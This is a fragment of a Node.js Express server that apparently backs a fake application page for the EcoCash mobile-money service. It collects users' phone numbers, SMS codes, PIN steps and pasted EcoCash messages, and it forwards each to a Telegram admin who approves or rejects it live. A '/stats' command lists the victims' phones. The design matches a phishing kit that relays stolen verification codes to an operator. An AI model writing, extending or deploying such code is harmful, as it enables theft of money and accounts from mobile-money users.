...
app.post('/api/send-application', async (req, res) => {
  ...
  const buttons = [[
    { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId: appId }) },
    { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId: appId }) }
  ]];
...
// Send EcoCash message – notify admin
app.post('/api/send-ecocash-message', async (req, res) => {
  const { applicationId, phone, ecocashMessage } = req.body.ecocashData;
  ...
  const message = `📨 *ECOCASH MESSAGE VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +263${phone}\n\n📩 *Message Content:*\n${ecocashMessage}\n\n✅ *Approve or reject:*`;
  const buttons = [[
...
app.post('/api/telegram-webhook', async (req, res) => {
  ...
  if (update.callback_query) {
    ...
    if (step === 'SMS') app.smsStatus = action === 'YES' ? 'approved' : 'rejected';
    else if (step === 'PIN') app.pinStatus = action === 'YES' ? 'approved' : 'rejected';
    ...
    if (chatId.toString() === TELEGRAM_CHAT_ID) {
      if (text === '/stats') {
        ...
        ids.forEach(id => {
          ...
          msg += `${id} – ${app.phone} (${app.smsStatus})\n`;
        });
